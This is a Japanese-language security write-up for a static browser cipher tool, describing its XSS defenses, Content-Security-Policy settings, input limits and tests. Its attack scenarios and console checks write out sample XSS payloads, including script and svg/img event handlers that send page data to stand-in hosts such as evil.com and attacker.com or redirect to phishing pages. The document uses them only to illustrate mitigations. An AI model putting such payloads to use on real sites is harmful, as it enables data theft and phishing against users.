# 🛡️ セキュリティ対策技術解説

**Columnar CipherLab**のセキュリティ実装について、XSS対策とCSP設定の技術的詳細を解説します。

---

## 📋 目次

- [🚨 脅威分析](#-脅威分析)
- [🛡️ XSS対策の実装](#️-xss対策の実装)
- [🔒 CSP設定による多層防御](#-csp設定による多層防御)
- [⚔️ 攻撃シナリオと対策効果](#️-攻撃シナリオと対策効果)
- [🔍 実装の技術的詳細](#-実装の技術的詳細)
- [✅ セキュリティテスト](#-セキュリティテスト)

---

## 🚨 脅威分析

本ツールはGitHub Pagesで公開する静的なページです。サーバー側の処理はなく、入力した文はブラウザーの中だけで処理し、どこにも送信しません。ログインもCookieも使いません。

### 🎯 想定攻撃ベクター

#### 1. ソーシャルエンジニアリング
```
攻撃者: 「この暗号化ツール試してみて！」
被害者: 悪意のある文字列（HTMLタグなど）を平文に入力
狙い: 入力がHTMLとして解釈され、スクリプトが動くこと
```

#### 2. 悪意のあるリンク共有
```
攻撃URL例:
https://ipusiron.github.io/columnar-cipherlab/?malicious=<script>...

狙い: URLパラメーターを介した攻撃
```

#### 3. 設定ファイル改ざん
```javascript
// data/presets.json への攻撃
{
  "name": "普通のサンプル<script>fetch('https://evil.com/steal')</script>",
  "plaintext": "正常な文字列"
}
```

---

## 🛡️ XSS対策の実装

### 🔧 文字列は textContent で入れる

入力した文・暗号文・プリセットの名前・エラーメッセージは、すべて`document.createElement`で作った要素の`textContent`に入れます。HTMLの文字列を組み立てて`innerHTML`に入れる処理はありません。

**実装場所**: `js/utils.js`

```javascript
// 要素を作る小さな関数（文字は textContent で入れる）
export function el(tag, { className, text, attrs } = {}, children = []) {
  const node = document.createElement(tag);
  if (className) node.className = className;
  if (text !== undefined) node.textContent = text;
  if (attrs) for (const [k, v] of Object.entries(attrs)) node.setAttribute(k, v);
  for (const child of children) node.appendChild(child);
  return node;
}
```

マトリクスの表（`renderGrid`）、暗号文と平文の色分け表示、エラーと注意の箇条書き、サンプルのメニューは、この関数で組み立てます。`<script>`と入力しても、画面には文字として`<script>`と出るだけです。

### 📥 プリセットの検証

`data/presets.json`を読み込むときに、`id`・`name`・`plaintext`が空でない文字列であること、`keyType`が`keyword`か`numeric`であること、`settings`がオブジェクトであることを確かめます。読み込めないときや形が合わないときは、コードに書いた予備のサンプル1件を使います。

### 🚀 入力の長さの制限

入力は1万文字（Unicodeのコードポイント単位）までに切り詰め、切り詰めたことを画面で知らせます。

```javascript
export const MAX_INPUT_LENGTH = 10000;

export function normalizeText(text, { stripSpace = false, stripSymbol = false, uppercase = false } = {}) {
  const chars = Array.from(String(text ?? '').normalize('NFC'));
  const truncated = chars.length > MAX_INPUT_LENGTH;
  // ...
}
```

鍵は64列（64文字）までです。

---

## 🔒 CSP設定による多層防御

### 📋 CSP設定内容

**実装場所**: `index.html`

```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self';
               connect-src 'self'; object-src 'none'; base-uri 'none'; form-action 'none'">
<meta name="referrer" content="no-referrer">
```

### 🔍 各ディレクティブの詳細

| ディレクティブ | 設定値 | 意味 | 防御対象 |
|---------------|--------|------|----------|
| `default-src` | `'self'` | 既定は同じオリジンのみ | 外部リソース全般 |
| `script-src` | `'self'` | スクリプトは同じオリジンのファイルのみ。インラインは不可 | スクリプトの注入 |
| `style-src` | `'self'` | スタイルは同じオリジンのファイルのみ。`style` 属性は不可 | CSSの注入 |
| `img-src` | `'self'` | 画像は同じオリジンのみ | 画像を使った外部送信 |
| `connect-src` | `'self'` | 通信は同じオリジンのみ（`data/presets.json` の読み込み） | 外部への送信 |
| `object-src` | `'none'` | オブジェクト埋め込みを禁止 | プラグインを使う攻撃 |
| `base-uri` | `'none'` | `<base>` 要素を禁止 | ベースURLの書き換え |
| `form-action` | `'none'` | フォームの送信先を禁止 | フォームを使った外部送信 |

`frame-ancestors`と`X-Frame-Options`は、metaタグでは有効にならないので書いていません。GitHub Pagesでは応答ヘッダーを設定できないため、ほかのサイトへの埋め込み（クリックジャッキング）は防げません。本ツールには埋め込まれて困る操作（送信・ログイン）はありません。

### 🛡️ インラインを許さない構成

- `index.html`にインラインのスクリプト、`<style>`要素、`style`属性、`onclick`などのイベント属性はない（`test/html.test.js`で検査する）
- テーマを読み込み前に当てる処理も`js/theme-init.js`というファイルに置く
- 表示の切り替えはクラス（`hidden`など）で行う。JavaScriptから`element.style`に代入する処理もない

---

## ⚔️ 攻撃シナリオと対策効果

### 🎯 シナリオ1: 悪意のあるプリセット

**攻撃手法**:
```javascript
// data/presets.json への攻撃
{
  "name": "①正常な名前<script>fetch('https://evil.com/steal')</script>",
  "description": "正常な説明<img src=x onerror=location.href='https://phishing.com'>"
}
```

**対策効果**:
1. 名前は`textContent`、説明は`title`属性に入れるので、タグとして解釈されない
2. CSPで、インラインのスクリプトと外部への通信が止まる
3. そもそも`data/presets.json`を書き換えられるのは、リポジトリーに書き込める人だけ

### 🎯 シナリオ2: 平文入力経由の攻撃

**攻撃手法**:
```
<svg onload=fetch('https://attacker.com/log?victim='+location.href)>Hello World</svg>
```

**対策効果**:
1. 「記号削除」がオンなら`<` `>` `=` `(`などが除かれる
2. オフでも、マトリクスと結果は`textContent`で入るので、文字として表示されるだけ
3. CSPで外部への通信が止まる

### 🎯 シナリオ3: URLパラメーター

**攻撃手法**:
```
https://ipusiron.github.io/columnar-cipherlab/?malicious=<script>document.location='https://fake-bank.com'</script>
```

**対策効果**:
1. 本ツールが読むURLパラメーターは`debug`だけで、値が`1`かどうかを比べるだけ。画面には出さない
2. パラメーターの機能を足すときも、値は`textContent`で入れる

### 🎯 シナリオ4: ソーシャルエンジニアリング

**攻撃手法**:
```
「この暗号化面白いよ！試してみて」
→ 被害者が以下を入力:
<img src=x onerror="fetch('https://evil.com/steal')">
```

**対策効果**:
1. 入力は文字として扱われ、`<img>`要素は作られない
2. 暗号化はそのまま進み、記号を残した設定なら`<img`などの文字も並べ替えの対象になる

---

## 🔍 実装の技術的詳細

### 🧾 ログ

デバッグのログは、URLに`?debug=1`を付けたときだけコンソールに出ます。出すのは初期化の進み具合だけで、入力した文・鍵・暗号文は出しません。

### 💾 ブラウザーの保存領域

テーマの選択（`light` / `dark`）だけを`localStorage`に保存します。プライベートブラウズなどで保存領域が使えない環境でも、例外を受け止めて動きます（その場合、テーマはそのページを開いている間だけ切り替わる）。

### 🗂️ file:// で開いたとき

ES Modulesは`file://`から読み込めないため、HTMLファイルを直接開くとツールは動きません。そのときは、HTTPで配信する方法を画面の上に表示します（この表示は通常のスクリプトで出すので、モジュールが読み込めなくても出る）。

### ⚠️ 制限事項

- 埋め込み（クリックジャッキング）の対策は、GitHub Pagesでは応答ヘッダーを設定できないため行っていない
- `textContent`とCSPで防げるのは、このページの中での注入である。利用者の端末やブラウザーの拡張機能が見る内容は防げない
- 縦列転置式暗号そのものは、秘密を守る暗号ではない（README.mdの「ユースケース」を参照）

---

## ✅ セキュリティテスト

### 🧪 自動テスト

`npm test`で、次を検査します（`test/html.test.js`）。

- CSPのmetaタグがあり、`'unsafe-inline'`と`'unsafe-eval'`を含まない。`frame-ancestors`を書いていない
- `src`のない`<script>`、`<style>`要素、`style`属性、イベント属性がない
- `target="_blank"`のリンクに`rel="noopener noreferrer"`がある
- スクリプトが参照するidが`index.html`にある

### 🔍 ブラウザーでの確認手順

1. 開発者ツールを開く（F12）
2. Consoleタブに移動する
3. 以下のテストコードを実行する

```javascript
// テスト1: 外部スクリプト読み込み（失敗すべき）
const script = document.createElement('script');
script.src = 'https://evil.com/malware.js';
document.head.appendChild(script);
// → CSP違反としてブロックされる

// テスト2: 外部画像読み込み（失敗すべき）
const img = document.createElement('img');
img.src = 'https://evil.com/tracker.png';
document.body.appendChild(img);
// → CSP違反としてブロックされる

// テスト3: 平文に HTML を入れる
// 平文欄に <img src=x onerror="alert(1)"> と入れ、「記号削除」を外して暗号化する
// → マトリクスに < や " が文字として並び、ダイアログは出ない
```

---

## 🎓 学習・参考リソース

- XSS対策: [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- CSP: [MDN Content Security Policy](https://developer.mozilla.org/docs/Web/HTTP/CSP)
- セキュリティベストプラクティス: [OWASP Top 10](https://owasp.org/www-project-top-ten/)

---

## 📝 まとめ

**Columnar CipherLab**では以下のセキュリティ対策を実装しています。

1. XSS対策：文字列は`textContent`で入れ、HTMLとして解釈しない
2. CSP設定：スクリプト・スタイル・画像・通信を同じオリジンに限り、インラインを許さない
3. 入力制限：入力1万文字・鍵64列まで
4. 自動テスト：CSPとインラインの有無を`npm test`で毎回検査する

これらは、XSSや外部リソースの注入といった想定した脅威の多くを緩和します。すべての攻撃を防ぐものではありません。
